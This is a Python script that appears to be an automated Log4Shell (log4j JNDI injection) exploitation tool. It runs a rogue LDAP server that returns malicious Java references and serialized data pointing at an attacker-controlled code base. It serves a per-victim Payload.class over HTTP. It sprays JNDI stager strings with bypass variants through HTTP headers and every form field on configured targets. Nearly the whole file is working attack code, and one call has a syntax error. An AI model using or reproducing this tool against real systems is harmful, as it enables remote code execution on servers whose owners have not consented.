#!/usr/bin/env python3
import asyncio
import importlib
import string

from bs4 import BeautifulSoup
from pyasn1.codec.ber.decoder import decode as ber_decode
from pyasn1.codec.ber.encoder import encode as ber_encode
from pyasn1.error import PyAsn1Error

from LDAP import LDAPMessage
from horrors import (
    events,
    logging,
    scenarios,
    services,
)


try:
    import attacker_config as config
except ImportError:
    exit('Configuration file `attacker_config.py` not found!')


def class_import(path):
    module, _, class_name = path.rpartition('.')
    path_module = importlib.import_module(module)
    clss = getattr(path_module, class_name)
    return clss


class Template(string.Template):

    delimiter = '%%'


class LDAP(services.Service):

    RESPONSE_LDAP_SERIALIZED = {
        'javaClassName': 'Payload',
        'javaCodeBase': 'http://$ATTACKER_HOST:$ATTACKER_PORT/',  # NOTE: Path must end with '/'
        'javaSerializedData': '\xac\xed\x00\x05\x73\x72\x00\x06\x43\x75\x73\x74\x6f\x6d\x2e\x2e\x6e\xdf\xa1\x51\x24\x51\x02\x00\x00\x78\x70',
    }
    RESPONSE_LDAP_REFERENCE = {
        'javaClassName': 'Payload',
        'javaCodeBase': 'http://$ATTACKER_HOST:$ATTACKER_PORT/',  # NOTE: Path must end with '/'
        'objectClass': 'javaNamingReference',
        'javaFactory': 'Payload',
    }
    RESPONSE_LDAP = {
        'reference': RESPONSE_LDAP_REFERENCE,
        'serialized': RESPONSE_LDAP_SERIALIZED,
    }

    def __init__(self, *args, **kwargs):
        context = kwargs.pop('context')
        super().__init__(*args, **kwargs)
        for ldap_type in self.RESPONSE_LDAP.values():
            for key, val in ldap_type.items():
                try:
                    ldap_type[key] = string.Template(val).substitute(context)
                except KeyError:
                    pass

    def deserialize(self, raw):
        return ber_decode(raw, asn1Spec=LDAPMessage())[0]

    def serialize(self, query_name):
        try:
            template = self.RESPONSE_LDAP[query_name]
        except KeyError:
            # NOTE: Fallback to `RESPONSE_LDAP_REFERENCE` by default if unknown query path
            template = self.RESPONSE_LDAP_REFERENCE
        return self.search_res_entry(query_name, template)

    def bind_response(self):
        record = LDAPMessage()
        record['messageID'] = 1
        res = record['protocolOp']['bindResponse']
        res['resultCode'] = 0
        res['matchedDN'] = ''
        res['errorMessage'] = ''
        response = ber_encode(record)
        logging.debug('Sending LDAP bindResponse: ' + str(response))
        return response

    def search_res_done(self):
        record = LDAPMessage()
        record['messageID'] = 2
        res = record['protocolOp']['searchResDone']
        res['resultCode'] = 0
        res['matchedDN'] = ''
        res['errorMessage'] = ''
        response = ber_encode(record)
        logging.debug('Sending LDAP searchResDone: ' + str(response))
        return response

    def search_res_entry(self, query_name, template):
        record = LDAPMessage()
        record['messageID'] = 2
        res = record['protocolOp']['searchResEntry']
        res['objectName'] = query_name
        index = 0
        for key, val in template.items():
            res['attributes'][index]['type'] = key
            res['attributes'][index]['vals'][0] = val
            index += 1
        response = ber_encode(record)
        logging.debug('Sending LDAP response: ' + str(response))
        return response

    async def handler(self, reader, writer):
        socket = writer.get_extra_info('socket')
        logging.info('{}:{} requested data, responding with payload...'.format(*socket.getpeername()))
        await reader.read(8096)  # NOTE: BindRequest
        writer.write(self.bind_response())
        query = await reader.read(8096)  # Note: SearchRequest
        try:
            query_name = self.deserialize(query)['protocolOp']['searchRequest']['baseObject']
        except PyAsn1Error:
            query_name = 'reference'
        logging.debug('Responding to query: ' + query_name)
        response = self.serialize(query_name)
        await writer.drain()
        writer.write(response)
        writer.write(self.search_res_done())
        writer.write_eof()
        writer.close()


class FuzzUri(scenarios.Scene):

    async def task(self, target, headers, payload):
        response = await self.http_get(target, headers)
        logging.debug('Got HTTP response: ' + str(response))
        if response['status'] == 200:
            input_fields = BeautifulSoup(response['content'], 'html.parser').find_all('input')
            if input_fields:
                data = {field.get('name'): payload for field in input_fields}
                response = await self.http_post(target, data headers)
                logging.debug('Got HTTP response: ' + str(response))


class SendRequests(scenarios.Scene):

    async def task(self):
        stagers = list()
        for ldap_type in LDAP.RESPONSE_LDAP.keys():
            for port in config.LDAP_PORTS:
                for bypass in config.BYPASSES:
                    stagers.append(
                        Template('${' + bypass + '/' + ldap_type + '}').substitute(LDAP_PORT=port, **self.context)
                    )
        for stager in stagers:
            logging.debug('Using stager: ' + stager)
            for header in config.HTTP_HEADERS:
                logging.debug('Using header: ' + header)
                headers = {header: stager}
                for target in config.TARGETS:
                    self.queue.add(FuzzUri, target, headers, stager)


class Server(services.HTTPStatic):

    def __init__(self, *args, **kwargs):
        super().__init__(*args, **kwargs)
        self.payload = class_import(config.PAYLOAD_CLS)(config)

    def payload(self, request, sock):
        context = self.scenario.context.copy()
        context['VICTIM_HOST'] = sock.getpeername()[0]
        output = self.payload.generate(context)
        logging.debug(str(context['VICTIM_HOST']) + ' requested payload, delivering...')
        return output


if __name__ == '__main__':

    context = {
        'ATTACKER_HOST': config.ATTACKER_HOST,
        'ATTACKER_PORT': config.ATTACKER_PORT,
        'COLLECTOR_PORT': config.COLLECTOR_PORT,
    }

    httpd = Server(address=context['ATTACKER_HOST'], port=context['ATTACKER_PORT'])
    httpd.add_route('/', 'Welcome')
    httpd.add_route('/send-requests', 'Sending requests...')
    httpd.add_route('/Payload.class', Server.payload)
    httpd.add_event('run', when=events.PathContains('send-requests'))

    story = scenarios.Scenario(context=context, http_headers={'User-Agent': 'Automated log4j testing'}, debug=True)
    # story = scenarios.Scenario(context=context, http_proxy='http://127.0.0.1:8088')
    story.add_service(httpd)
    for port in config.LDAP_PORTS:
        story.add_service(LDAP(address=context['ATTACKER_HOST'], port=port, context=context))
    story.add_scene(SendRequests, when='run')
    story.add_scene(SendRequests)
    story.play()
